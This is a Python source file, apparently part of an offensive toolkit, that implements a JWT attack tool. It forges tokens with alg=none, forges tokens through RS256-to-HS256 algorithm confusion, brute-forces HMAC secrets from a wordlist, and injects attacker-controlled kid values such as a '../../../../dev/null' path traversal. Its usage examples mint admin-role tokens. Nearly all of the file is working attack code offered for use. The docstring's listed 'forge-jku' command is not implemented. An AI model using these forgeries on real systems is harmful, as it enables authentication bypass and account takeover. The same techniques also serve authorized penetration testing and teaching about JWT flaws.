#!/usr/bin/env python3
"""
redshift_toolkit.utils.jwt_tool — JWT swiss-army knife for offensive use.

Capabilities
------------
- decode      : parse a token, show header + claims
- sign        : produce a token (any alg, any key, or `none`)
- alg-none    : strip signature, set alg=none
- alg-confuse : forge an HS256 token using an RSA public key as HMAC secret
- brute       : crack weak HS256 secrets with a wordlist
- kid-inject  : produce tokens with attacker-controlled `kid` parameter
- forge-jku   : produce tokens with attacker-controlled `jku` (JWKS URL)

API and CLI both supported.

Usage
-----
  python3 -m redshift_toolkit.utils.jwt_tool decode TOKEN
  python3 -m redshift_toolkit.utils.jwt_tool alg-none TOKEN
  python3 -m redshift_toolkit.utils.jwt_tool brute TOKEN -w wordlist.txt
  python3 -m redshift_toolkit.utils.jwt_tool sign --alg HS256 --secret 'changeme' \\
      --claims '{"sub":"alice","role":"admin"}'
  python3 -m redshift_toolkit.utils.jwt_tool alg-confuse TOKEN --pubkey-file rsa_pub.pem
  python3 -m redshift_toolkit.utils.jwt_tool kid-inject TOKEN \\
      --kid "../../../../dev/null" --secret ""

Author: Redshift Project — Module 07
License: MIT — Authorized testing only.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
from dataclasses import dataclass

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


@dataclass
class Jwt:
    header: dict
    claims: dict
    signature: bytes
    raw_signing_input: bytes  # bytes that were/should be signed

    @classmethod
    def parse(cls, token: str) -> "Jwt":
        parts = token.strip().split(".")
        if len(parts) != 3:
            raise ValueError("not a 3-part JWT")
        header = json.loads(b64url_decode(parts[0]))
        claims = json.loads(b64url_decode(parts[1]))
        sig = b64url_decode(parts[2])
        signing_input = (parts[0] + "." + parts[1]).encode()
        return cls(header=header, claims=claims, signature=sig,
                   raw_signing_input=signing_input)

    def serialize(self, signature: bytes | None = None) -> str:
        h = b64url_encode(json.dumps(self.header, separators=(",", ":")).encode())
        c = b64url_encode(json.dumps(self.claims, separators=(",", ":")).encode())
        sig = signature if signature is not None else self.signature
        return f"{h}.{c}.{b64url_encode(sig)}"


# ─── Operations ─────────────────────────────────────────────────────────────
def op_decode(token: str, color: bool) -> int:
    j = Jwt.parse(token)
    print(paint("=== HEADER ===", BOLD, color))
    print(json.dumps(j.header, indent=2))
    print(paint("\n=== CLAIMS ===", BOLD, color))
    print(json.dumps(j.claims, indent=2))
    print(paint("\n=== SIGNATURE ===", BOLD, color))
    print(f"  bytes: {len(j.signature)}")
    print(f"  hex:   {j.signature.hex()[:80]}{'…' if len(j.signature) > 40 else ''}")
    if j.header.get("alg") == "none":
        print(paint("\n[!] alg=none — token is unsigned. Already a finding.",
                    RED, color))
    return 0


def op_alg_none(token: str) -> int:
    j = Jwt.parse(token)
    j.header["alg"] = "none"
    print(j.serialize(signature=b""))
    return 0


def op_sign(args, color: bool) -> int:
    header = {"typ": "JWT", "alg": args.alg}
    if args.kid:
        header["kid"] = args.kid
    if args.jku:
        header["jku"] = args.jku
    claims = json.loads(args.claims)
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    c = b64url_encode(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = (h + "." + c).encode()

    if args.alg == "none":
        sig = b""
    elif args.alg.startswith("HS"):
        digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                  "HS512": hashlib.sha512}[args.alg]
        secret = args.secret.encode() if args.secret is not None else b""
        sig = hmac.new(secret, signing_input, digest).digest()
    else:
        print(f"[!] sign: alg {args.alg} not implemented in this stdlib-only toolkit; "
              "use a separate tool for RS*/ES*/PS*", file=sys.stderr)
        return 2

    print(f"{h}.{c}.{b64url_encode(sig)}")
    return 0


def op_alg_confuse(token: str, pubkey_path: str, color: bool) -> int:
    """Forge an HS256 token, using the RSA public key bytes as the HMAC secret.

    Vulnerable servers that accept multiple algorithms but call
    `verify(token, public_key)` will compute HMAC-SHA256 of the signing
    input with `public_key` as the secret — and match.
    """
    with open(pubkey_path, "rb") as f:
        pub_bytes = f.read()
    j = Jwt.parse(token)
    j.header["alg"] = "HS256"
    h = b64url_encode(json.dumps(j.header, separators=(",", ":")).encode())
    c = b64url_encode(json.dumps(j.claims, separators=(",", ":")).encode())
    signing_input = (h + "." + c).encode()
    sig = hmac.new(pub_bytes, signing_input, hashlib.sha256).digest()
    print(f"{h}.{c}.{b64url_encode(sig)}")
    print(paint(
        "\n[*] alg-confusion forgery printed above. The server must accept HS256\n"
        "    and load the RSA public key as the verification secret for this to work.",
        YELLOW, color), file=sys.stderr)
    return 0


def op_brute(token: str, wordlist_path: str, color: bool) -> int:
    j = Jwt.parse(token)
    alg = j.header.get("alg")
    if alg not in ("HS256", "HS384", "HS512"):
        print(f"[!] brute: alg {alg} not HMAC — nothing to crack", file=sys.stderr)
        return 2
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
              "HS512": hashlib.sha512}[alg]

    tried = 0
    with open(wordlist_path, "rb") as wl:
        for line in wl:
            secret = line.rstrip(b"\r\n")
            tried += 1
            mac = hmac.new(secret, j.raw_signing_input, digest).digest()
            if hmac.compare_digest(mac, j.signature):
                print(paint(
                    f"[+] FOUND after {tried} attempts: secret={secret.decode('latin-1')!r}",
                    GREEN, color))
                return 0
            if tried % 5000 == 0 and color:
                print(f"    [*] tried {tried} ...", file=sys.stderr)
    print(paint(f"[-] no match after {tried} candidates", RED, color))
    return 1


def op_kid_inject(token: str, kid: str, secret: str, color: bool) -> int:
    """Produce a token with an attacker-controlled `kid` value.

    Useful when the server builds a file path or SQL query from the kid
    without sanitization. We sign with a chosen secret (often empty,
    matching `/dev/null` or a known empty file).
    """
    j = Jwt.parse(token)
    j.header["alg"] = "HS256"
    j.header["kid"] = kid
    h = b64url_encode(json.dumps(j.header, separators=(",", ":")).encode())
    c = b64url_encode(json.dumps(j.claims, separators=(",", ":")).encode())
    signing_input = (h + "." + c).encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    print(f"{h}.{c}.{b64url_encode(sig)}")
    print(paint(
        f"\n[*] kid-injection token printed above with kid={kid!r}",
        YELLOW, color), file=sys.stderr)
    return 0


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


# ─── CLI ────────────────────────────────────────────────────────────────────
def main() -> int:
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--no-color", action="store_true")

    ap = argparse.ArgumentParser(description="JWT decode / forge / crack toolkit.",
                                 parents=[common])
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("decode", parents=[common])
    p.add_argument("token")

    p = sub.add_parser("alg-none", parents=[common])
    p.add_argument("token")

    s = sub.add_parser("sign", parents=[common])
    s.add_argument("--alg", default="HS256",
                   choices=["HS256", "HS384", "HS512", "none"])
    s.add_argument("--secret", default="")
    s.add_argument("--claims", required=True, help='JSON object string')
    s.add_argument("--kid", default=None)
    s.add_argument("--jku", default=None)

    s = sub.add_parser("alg-confuse", parents=[common])
    s.add_argument("token")
    s.add_argument("--pubkey-file", required=True,
                   help="RSA public key in PEM form (the bytes are used as HMAC secret)")

    s = sub.add_parser("brute", parents=[common])
    s.add_argument("token")
    s.add_argument("-w", "--wordlist", required=True)

    s = sub.add_parser("kid-inject", parents=[common])
    s.add_argument("token")
    s.add_argument("--kid", required=True)
    s.add_argument("--secret", default="")

    args = ap.parse_args()
    color = sys.stdout.isatty() and not args.no_color

    if args.cmd == "decode":
        return op_decode(args.token, color)
    if args.cmd == "alg-none":
        return op_alg_none(args.token)
    if args.cmd == "sign":
        return op_sign(args, color)
    if args.cmd == "alg-confuse":
        return op_alg_confuse(args.token, args.pubkey_file, color)
    if args.cmd == "brute":
        return op_brute(args.token, args.wordlist, color)
    if args.cmd == "kid-inject":
        return op_kid_inject(args.token, args.kid, args.secret, color)
    return 2


if __name__ == "__main__":
    sys.exit(main())
